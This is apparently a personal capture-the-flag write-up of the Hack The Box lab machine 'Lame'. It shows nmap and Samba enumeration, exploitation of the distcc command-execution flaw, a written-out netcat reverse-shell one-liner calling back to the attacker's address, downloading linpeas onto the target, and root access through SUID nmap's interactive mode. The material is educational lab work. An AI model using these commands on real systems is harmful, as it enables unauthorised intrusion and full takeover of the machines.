## Description
Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.

## Enumeration
The first step is to check for the services available on the machine:
```
$nmap -sC -sV -p- 10.129.151.43 | tee -a nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-16 11:43 CEST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.60 seconds
```
It seems ping are blocked, so I try again with `-Pn` as suggested:
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-16 11:44 CEST
Nmap scan report for 10.129.151.43
Host is up (0.021s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.22
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m26s, deviation: 2h49m45s, median: 24s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-09-16T05:47:37-04:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 171.55 seconds
```
### FTP
It seems there is an FTP server with anonymous login allowed. Let's look what we get on it:
```
$ftp 10.129.151.43
Connected to 10.129.151.43.
220 (vsFTPd 2.3.4)
Name (10.129.151.43:x5450): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> pwd
257 "/"
```
It seems there is nothing interesting on the server.

We can see in the nmap report that the server is vsFTPd 2.3.4:
```
$searchsploit vsFTPd | tee -a searchsploit_vsFTPd
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                                                                                              | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                                                                                              | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                                                                                              | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                                                                                            | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                   | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                      | unix/remote/17491.rb
vsftpd 3.0.3 - Remote Denial of Service                                                                                                                     | multiple/remote/49719.py
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
It seems to be an exploit for this version of the server. Let's use `msfconsole` to get more information on it.
```
[msf](Jobs:0 Agents:0) >> search exploit vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor

[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to cmd/unix/interact
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> info

       Name: VSFTPD v2.3.4 Backdoor Command Execution
     Module: exploit/unix/ftp/vsftpd_234_backdoor
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2011-07-03

Provided by:
  hdm <x@hdm.io>
  MC <mc@metasploit.com>

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic

Check supported:
  No

Basic options:
  Name    Current Setting  Required  Description
  ----    ---------------  --------  -----------
  RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT   21               yes       The target port (TCP)

Payload information:
  Space: 2000
  Avoid: 0 characters

Description:
  This module exploits a malicious backdoor that was added to the 
  VSFTPD download archive. This backdoor was introduced into the 
  vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 
  according to the most recent information available. This backdoor 
  was removed on July 3rd 2011.

References:
  OSVDB (73573)
  http://pastebin.com/AetT9sS5
  http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html


View the full module info with the info -d command.
```
Let's try to exploit it:
```
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> set RHOSTS 10.129.151.43
RHOSTS => 10.129.151.43
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> run

[*] 10.129.151.43:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.129.151.43:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```
I tried to look at different payloads, but it seems I do not have many choices:
```
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> show payloads

Compatible Payloads
===================

   #  Name                       Disclosure Date  Rank    Check  Description
   -  ----                       ---------------  ----    -----  -----------
   0  payload/cmd/unix/interact                   normal  No     Unix Command, Interact with Established Connection
```
Searchsploit references another exploit using Python:
```
$cp /usr/share/exploitdb/exploits/unix/remote/49757.py vsftpd_exploit.py
$python3 vsftpd_exploit.py 10.129.123.233
Traceback (most recent call last):
  File "/home/x5450/Documents/htb/machines/lame/vsftpd_exploit.py", line 37, in <module>
    tn2=Telnet(host, 6200)
  File "/usr/lib/python3.9/telnetlib.py", line 218, in __init__
    self.open(host, port, timeout)
  File "/usr/lib/python3.9/telnetlib.py", line 235, in open
    self.sock = socket.create_connection((host, port), timeout)
  File "/usr/lib/python3.9/socket.py", line 843, in create_connection
    raise err
  File "/usr/lib/python3.9/socket.py", line 831, in create_connection
    sock.connect(sa)
TimeoutError: [Errno 110] Connection timed out
```
It seems no backdoor is opened at port 6200. Maybe the server has been patched.
### Samba
Using `msfconsole`, we can get the version of the Samba server:
```
[msf](Jobs:0 Agents:0) >> search scanner smb

Matching Modules
================

   #   Name                                                            Disclosure Date  Rank    Check  Description
   -   ----                                                            ---------------  ----    -----  -----------
   20  auxiliary/scanner/smb/smb_version                                                normal  No     SMB Version Detection

Interact with a module by name or index. For example info 23, use 23 or use auxiliary/scanner/smb/impacket/wmiexec

[msf](Jobs:0 Agents:0) >> use 20
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) >> options

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   THREADS  1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) >> set RHOSTS 10.129.123.233
RHOSTS => 10.129.123.233
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) >> run

[*] 10.129.123.233:445    - SMB Detected (versions:1) (preferred dialect:) (signatures:optional)
[*] 10.129.123.233:445    -   Host could not be identified: Unix (Samba 3.0.20-Debian)
[*] 10.129.123.233:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Well... this information was already available in the nmap log. :)

We can also use nmap scripts to enumerate Samba servers:
```
$nmap --script "smb-enum-*" -Pn -p 445 10.129.123.233 | tee -a scans/nmap_smb_enum
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-16 13:59 CEST
Nmap scan report for 10.129.123.233
Host is up (0.021s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: <blank>
|   \\10.129.123.233\ADMIN$: 
|     Type: STYPE_IPC
|     Comment: IPC Service (lame server (Samba 3.0.20-Debian))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: <none>
|   \\10.129.123.233\IPC$: 
|     Type: STYPE_IPC
|     Comment: IPC Service (lame server (Samba 3.0.20-Debian))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|   \\10.129.123.233\opt: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: <none>
|   \\10.129.123.233\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|   \\10.129.123.233\tmp: 
|     Type: STYPE_DISKTREE
|     Comment: oh noes!
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|_    Anonymous access: READ/WRITE
| smb-enum-users: 
|   LAME\backup (RID: 1068)
|     Full name:   backup
|     Flags:       Normal user account, Account disabled
|   LAME\bin (RID: 1004)
|     Full name:   bin
|     Flags:       Normal user account, Account disabled
|   LAME\bind (RID: 1210)
|     Flags:       Normal user account, Account disabled
|   LAME\daemon (RID: 1002)
|     Full name:   daemon
|     Flags:       Normal user account, Account disabled
|   LAME\dhcp (RID: 1202)
|     Flags:       Normal user account, Account disabled
|   LAME\distccd (RID: 1222)
|     Flags:       Normal user account, Account disabled
|   LAME\ftp (RID: 1214)
|     Flags:       Normal user account, Account disabled
|   LAME\games (RID: 1010)
|     Full name:   games
|     Flags:       Normal user account, Account disabled
|   LAME\gnats (RID: 1082)
|     Full name:   Gnats Bug-Reporting System (admin)
|     Flags:       Normal user account, Account disabled
|   LAME\irc (RID: 1078)
|     Full name:   ircd
|     Flags:       Normal user account, Account disabled
|   LAME\klog (RID: 1206)
|     Flags:       Normal user account, Account disabled
|   LAME\libuuid (RID: 1200)
|     Flags:       Normal user account, Account disabled
|   LAME\list (RID: 1076)
|     Full name:   Mailing List Manager
|     Flags:       Normal user account, Account disabled
|   LAME\lp (RID: 1014)
|     Full name:   lp
|     Flags:       Normal user account, Account disabled
|   LAME\mail (RID: 1016)
|     Full name:   mail
|     Flags:       Normal user account, Account disabled
|   LAME\man (RID: 1012)
|     Full name:   man
|     Flags:       Normal user account, Account disabled
|   LAME\msfadmin (RID: 3000)
|     Full name:   msfadmin,,,
|     Flags:       Normal user account
|   LAME\mysql (RID: 1218)
|     Full name:   MySQL Server,,,
|     Flags:       Normal user account, Account disabled
|   LAME\news (RID: 1018)
|     Full name:   news
|     Flags:       Normal user account, Account disabled
|   LAME\nobody (RID: 501)
|     Full name:   nobody
|     Flags:       Normal user account, Account disabled
|   LAME\postfix (RID: 1212)
|     Flags:       Normal user account, Account disabled
|   LAME\postgres (RID: 1216)
|     Full name:   PostgreSQL administrator,,,
|     Flags:       Normal user account, Account disabled
|   LAME\proftpd (RID: 1226)
|     Flags:       Normal user account, Account disabled
|   LAME\proxy (RID: 1026)
|     Full name:   proxy
|     Flags:       Normal user account, Account disabled
|   LAME\root (RID: 1000)
|     Full name:   root
|     Flags:       Normal user account, Account disabled
|   LAME\service (RID: 3004)
|     Full name:   ,,,
|     Flags:       Normal user account, Account disabled
|   LAME\sshd (RID: 1208)
|     Flags:       Normal user account, Account disabled
|   LAME\sync (RID: 1008)
|     Full name:   sync
|     Flags:       Normal user account, Account disabled
|   LAME\sys (RID: 1006)
|     Full name:   sys
|     Flags:       Normal user account, Account disabled
|   LAME\syslog (RID: 1204)
|     Flags:       Normal user account, Account disabled
|   LAME\telnetd (RID: 1224)
|     Flags:       Normal user account, Account disabled
|   LAME\tomcat55 (RID: 1220)
|     Flags:       Normal user account, Account disabled
|   LAME\user (RID: 3002)
|     Full name:   just a user,111,,
|     Flags:       Normal user account
|   LAME\uucp (RID: 1020)
|     Full name:   uucp
|     Flags:       Normal user account, Account disabled
|   LAME\www-data (RID: 1066)
|     Full name:   www-data
|_    Flags:       Normal user account, Account disabled
|_smb-enum-sessions: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 380.73 seconds
```
We know that there are two shares with anonymous access: IPC and tmp. There is also different accounts that are not disabled: `msfadmin` and user.
Anonymous login to these shares seem to fail:
```
┌─[✗]─[x5450@parrot]─[~/Documents/htb/machines/lame]
└──╼ $smbclient //10.129.123.233/tmp -W LAME -U %
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
┌─[✗]─[x5450@parrot]─[~/Documents/htb/machines/lame]
└──╼ $smbclient //10.129.123.233/IPC -W LAME -U %
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```
I note that I have the error `NT_STATUS_CONNECTION_DISCONNECTED` which means that the protocol negotiation failed.
This can be fixed by add these lines in `/etc/samba/smb.conf` under `[global]`:
```
client min protocol = CORE
client max protocol = SMB3
```
I can now be logged in the tmp share:
```
┌─[✗]─[x5450@parrot]─[~/Documents/htb/machines/lame]
└──╼ $smbclient //10.129.123.233/tmp -W LAME -U %
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Sep 16 15:04:16 2023
  ..                                 DR        0  Sat Oct 31 07:33:58 2020
  5621.jsvc_up                        R        0  Sat Sep 16 13:28:42 2023
  .ICE-unix                          DH        0  Sat Sep 16 13:27:28 2023
  vmware-root                        DR        0  Sat Sep 16 13:28:37 2023
  .X11-unix                          DH        0  Sat Sep 16 13:27:54 2023
  .X0-lock                           HR       11  Sat Sep 16 13:27:54 2023
  vgauthsvclog.txt.0                  R     1600  Sat Sep 16 13:27:27 2023
```
Only two files can be retrieved: `vgauthsvclog.txt.0` and `.X0-lock`:
```
$cat X0-lock 
      5683
$cat vgauthsvclog.txt.0 
[Sep 16 07:27:26.972] [ message] [VGAuthService] VGAuthService 'build-4448496' logging at level 'normal'
[Sep 16 07:27:26.972] [ message] [VGAuthService] Pref_LogAllEntries: 1 preference groups in file '/etc/vmware-tools/vgauth.conf'
[Sep 16 07:27:26.972] [ message] [VGAuthService] Group 'service'
[Sep 16 07:27:26.972] [ message] [VGAuthService] 	 samlSchemaDir=/usr/lib/vmware-vgauth/schemas
[Sep 16 07:27:26.972] [ message] [VGAuthService] Pref_LogAllEntries: End of preferences
[Sep 16 07:27:27.033] [ message] [VGAuthService] VGAuthService 'build-4448496' logging at level 'normal'
[Sep 16 07:27:27.033] [ message] [VGAuthService] Pref_LogAllEntries: 1 preference groups in file '/etc/vmware-tools/vgauth.conf'
[Sep 16 07:27:27.033] [ message] [VGAuthService] Group 'service'
[Sep 16 07:27:27.033] [ message] [VGAuthService] 	 samlSchemaDir=/usr/lib/vmware-vgauth/schemas
[Sep 16 07:27:27.033] [ message] [VGAuthService] Pref_LogAllEntries: End of preferences
[Sep 16 07:27:27.033] [ message] [VGAuthService] Cannot load message catalog for domain 'VGAuthService', language 'C', catalog dir '.'.
[Sep 16 07:27:27.033] [ message] [VGAuthService] INIT SERVICE
[Sep 16 07:27:27.033] [ message] [VGAuthService] Using '/var/lib/vmware/VGAuth/aliasStore' for alias store root directory
[Sep 16 07:27:27.082] [ message] [VGAuthService] SAMLCreateAndPopulateGrammarPool: Using '/usr/lib/vmware-vgauth/schemas' for SAML schemas
[Sep 16 07:27:27.112] [ message] [VGAuthService] SAML_Init: Allowing 300 of clock skew for SAML date validation
[Sep 16 07:27:27.112] [ message] [VGAuthService] BEGIN SERVICE
```
I do not know what to do with this information.

### SSH
The SSH server version is OpenSSH 4.7p1. According to a GitHub script, it seems this version is vulnerable: https://github.com/pankajjarial360/OpenSSH_4.7p1
However, by reading the exploit, it seems to run a bruteforce using MetaSploit and a default wordlist. I do not see how this could exploit anything. I run it just to be sure, but I have no hope.

### `distcc`
`distcc` seems to have a vulnerability that could be exploited using MetaSploit:
```
[msf](Jobs:0 Agents:0) >> search exploit distcc

Matching Modules
================

   #  Name                           Disclosure Date  Rank       Check  Description
   -  ----                           ---------------  ----       -----  -----------
   0  exploit/unix/misc/distcc_exec  2002-02-01       excellent  Yes    DistCC Daemon Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/misc/distcc_exec

[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to cmd/unix/reverse_bash
[msf](Jobs:0 Agents:0) exploit(unix/misc/distcc_exec) >> set rhosts 10.129.106.70
rhosts => 10.129.106.70
[msf](Jobs:0 Agents:0) exploit(unix/misc/distcc_exec) >> check
[+] 10.129.106.70:3632 - The target is vulnerable.
[msf](Jobs:0 Agents:0) exploit(unix/misc/distcc_exec) >> run

[*] Started reverse TCP handler on 192.168.0.87:4444 
[*] 10.129.106.70:3632 - stderr: bash: 188: Bad file descriptor
[*] 10.129.106.70:3632 - stderr: bash: /dev/tcp/192.168.0.87/4444: No such file or directory
[*] 10.129.106.70:3632 - stderr: bash: 188: Bad file descriptor
[*] Exploit completed, but no session was created.
```
I tried different payloads but no one seems to work.

According to [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/3632-pentesting-distcc), nmap has a script to exploit the vulnerability.
```
$wget https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse
--2023-09-18 18:57:43--  https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse
Resolving svn.nmap.org (svn.nmap.org)... 2600:3c01:e000:3e6::6d4e:7061, 45.33.49.119
Connecting to svn.nmap.org (svn.nmap.org)|2600:3c01:e000:3e6::6d4e:7061|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3519 (3,4K) [text/plain]
Saving to: ‘distcc-cve2004-2687.nse’

distcc-cve2004-2687.nse                         100%[=====================================================================================================>]   3,44K  --.-KB/s    in 0s      

2023-09-18 18:57:43 (118 MB/s) - ‘distcc-cve2004-2687.nse’ saved [3519/3519]

$nmap -Pn -p 3632 10.129.106.70 --script ./distcc-cve2004-2687.nse  --script-args="cmd='whoami'"
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-18 19:01 CEST
Nmap scan report for 10.129.106.70
Host is up (0.020s latency).

PORT     STATE SERVICE
3632/tcp open  distccd
| distcc-cve2004-2687: 
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|       
|     Disclosure date: 2002-02-01
|     Extra information:
|       
|     daemon
|   
|     References:
|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
|_      https://distcc.github.io/security.html

Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds
```
Perfect! We have a remote code execution with the user daemon. We can now set a reverse shell to get access to the machine:
```
# In one console, listen on port 4444
$nc -lnvp 4444
# In another console, run nmap command
$nmap -Pn -p 3632 10.129.106.70 --script ./distcc-cve2004-2687.nse  --script-args="cmd='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.86 4444 >/tmp/f'"
```
It works! I've got a shell:
```
sh-3.2$ ls /home
ftp
makis
service
user
sh-3.2$ ls /home/makis
user.txt
sh-3.2$ cat /home/makis/user.txt
3[...SNIP...]0
```
## Privilege escalation
I will run linpeas.sh to check if a vulnerability could help to escalate to root. First, I will run a Python HTTP server on a folder containing linpeas.sh:
```
$ls
linpeas.sh
$sudo python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```
Then, I can download it from the machine:
```
sh-3.2$ cd /tmp
sh-3.2$ wget http://10.10.14.86:8080/linpeas.sh
--13:09:21--  http://10.10.14.86:8080/linpeas.sh
           => `linpeas.sh'
Connecting to 10.10.14.86:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 848,400 (829K) [text/x-sh]

    0K .......... .......... .......... .......... ..........  6%  890.57 KB/s
   50K .......... .......... .......... .......... .......... 12%    2.52 MB/s
  100K .......... .......... .......... .......... .......... 18%    2.70 MB/s
  150K .......... .......... .......... .......... .......... 24%    3.94 MB/s
  200K .......... .......... .......... .......... .......... 30%    5.28 MB/s
  250K .......... .......... .......... .......... .......... 36%    4.21 MB/s
  300K .......... .......... .......... .......... .......... 42%   12.15 MB/s
  350K .......... .......... .......... .......... .......... 48%    8.89 MB/s
  400K .......... .......... .......... .......... .......... 54%    7.87 MB/s
  450K .......... .......... .......... .......... .......... 60%    5.54 MB/s
  500K .......... .......... .......... .......... .......... 66%    9.94 MB/s
  550K .......... .......... .......... .......... .......... 72%    6.69 MB/s
  600K .......... .......... .......... .......... .......... 78%    5.82 MB/s
  650K .......... .......... .......... .......... .......... 84%    9.86 MB/s
  700K .......... .......... .......... .......... .......... 90%    5.88 MB/s
  750K .......... .......... .......... .......... .......... 96%    7.16 MB/s
  800K .......... .......... ........                        100%    8.79 MB/s

13:09:21 (4.14 MB/s) - `linpeas.sh' saved [848400/848400]

sh-3.2$ chmod +x linpeas.sh
```
I can now run it with the user daemon:
```
sh-3.2$ ./linpeas.sh
```
Here is what I found interesting:
```
                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root 63K Apr 14  2008 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-- 1 root fuse 20K Feb 26  2008 /bin/fusermount
-rwsr-xr-x 1 root root 25K Apr  2  2008 /bin/su
-rwsr-xr-x 1 root root 80K Apr 14  2008 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 31K Dec 10  2007 /bin/ping
-rwsr-xr-x 1 root root 27K Dec 10  2007 /bin/ping6
-rwsr-xr-x 1 root root 64K Dec  2  2008 /sbin/mount.nfs
-rwsr-xr-- 1 root dhcp 2.9K Apr  2  2008 /lib/dhcp3-client/call-dhclient-script (Unknown SUID binary!)
-rwsr-xr-x 2 root root 106K Feb 25  2008 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerableedit
-rwsr-sr-x 1 root root 7.3K Jun 25  2008 /usr/bin/X
-rwsr-xr-x 1 root root 8.4K Nov 22  2007 /usr/bin/netkit-rsh
-rwsr-xr-x 1 root root 37K Apr  2  2008 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 13K Dec 10  2007 /usr/bin/traceroute6.iputils
-rwsr-xr-x 2 root root 106K Feb 25  2008 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 12K Nov 22  2007 /usr/bin/netkit-rlogin
-rwsr-xr-x 1 root root 11K Dec 10  2007 /usr/bin/arping
You own the SUID file: /usr/bin/at
-rwsr-xr-x 1 root root 19K Apr  2  2008 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 28K Apr  2  2008 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 763K Apr  8  2008 /usr/bin/nmap
-rwsr-xr-x 1 root root 24K Apr  2  2008 /usr/bin/chsh
-rwsr-xr-x 1 root root 16K Nov 22  2007 /usr/bin/netkit-rcp
-rwsr-xr-x 1 root root 29K Apr  2  2008 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 46K Mar 31  2008 /usr/bin/mtr
-rwsr-sr-x 1 libuuid libuuid 13K Mar 27  2008 /usr/sbin/uuidd
-rwsr-xr-- 1 root dip 263K Oct  4  2007 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-- 1 root telnetd 5.9K Dec 17  2006 /usr/lib/telnetlogin
-rwsr-xr-- 1 root www-data 11K Mar  9  2010 /usr/lib/apache2/suexec
-rwsr-xr-x 1 root root 4.5K Nov  5  2007 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 162K Apr  6  2008 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 9.4K Aug 17  2009 /usr/lib/pt_chown  --->  GNU_glibc_2.1/2.1.1_-6(08-1999)
-r-sr-xr-x 1 root root 14K Nov  3  2020 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 9.4K Nov  3  2020 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
```
There is SUID set for nmap. I am wondering if it is possible to run a command locally using nmap and, therefore, be able to run a command as root:
```
sh-3.2$ nmap --interactive

Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !whoami
root
system() execution of command failed
nmap> !cat /root/root.txt
e[...SNIP...]9
```
Thanks to the interactive mode of nmap, I am able to execute any commands as root, so I can get the flag!
## Learning from other writeups
### Official writeup
In the official writeup, the Samba service is exploited using an RCE vulnerability (CVE-2007-2447). A metasploit exploit (`multi/samba/usermap_script`) exists to exploit this vulnerability in less than 10 seconds. Then, you're logged as root, and you can get both flags. The question now is why I missed this. I did a search on the samba exploits on metasploit, but I was not able to say if the exploit was applicable:
```
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> search exploit samba

Matching Modules
================

   #   Name                                                 Disclosure Date  Rank       Check  Description
   -   ----                                                 ---------------  ----       -----  -----------
   0   exploit/unix/webapp/citrix_access_gateway_exec       2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution
   1   exploit/windows/license/calicclnt_getconfig          2005-03-02       average    No     Computer Associates License Client GETCONFIG Overflow
   2   exploit/unix/misc/distcc_exec                        2002-02-01       excellent  Yes    DistCC Daemon Command Execution
   3   exploit/windows/smb/group_policy_startup             2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
   4   exploit/windows/fileformat/ms14_060_sandworm         2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
   5   exploit/unix/http/quest_kace_systems_management_rce  2018-05-31       excellent  Yes    Quest KACE Systems Management Command Injection
   6   exploit/multi/samba/usermap_script                   2007-05-14       excellent  No     Samba "username map script" Command Execution
   7   exploit/multi/samba/nttrans                          2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
   8   exploit/linux/samba/setinfopolicy_heap               2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow
   9   auxiliary/admin/smb/samba_symlink_traversal                           normal     No     Samba Symlink Directory Traversal
   10  exploit/linux/samba/chain_reply                      2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
   11  exploit/linux/samba/is_known_pipename                2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
   12  exploit/linux/samba/lsa_transnames_heap              2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
   13  exploit/osx/samba/lsa_transnames_heap                2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   14  exploit/solaris/samba/lsa_transnames_heap            2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   15  exploit/freebsd/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow (*BSD x86)
   16  exploit/linux/samba/trans2open                       2003-04-07       great      No     Samba trans2open Overflow (Linux x86)
   17  exploit/osx/samba/trans2open                         2003-04-07       great      No     Samba trans2open Overflow (Mac OS X PPC)
   18  exploit/solaris/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow (Solaris SPARC)
   19  exploit/windows/http/sambar6_search_results          2003-06-21       normal     Yes    Sambar 6 Search Results Buffer Overflow
```
We can see the exploit at line 6, but how could I guess this script was applicable to this Samba server? Should I read all exploit information one by one?
Well, I could find it using `searchsploit`:
```
$searchsploit samba
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
[...]
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                            | unix/remote/16320.rb
[...]
```
I think I missed it because I search for `smb` and not `samba`.
### 0xdf writeup
In 0xdf writeup, there is an explanation on why the exploit for the vsftpd server fails. It seems to be due to the firewall. There is also a demo to check it: https://0xdf.gitlab.io/2020/04/07/htb-lame.html#beyond-root---vsftpd

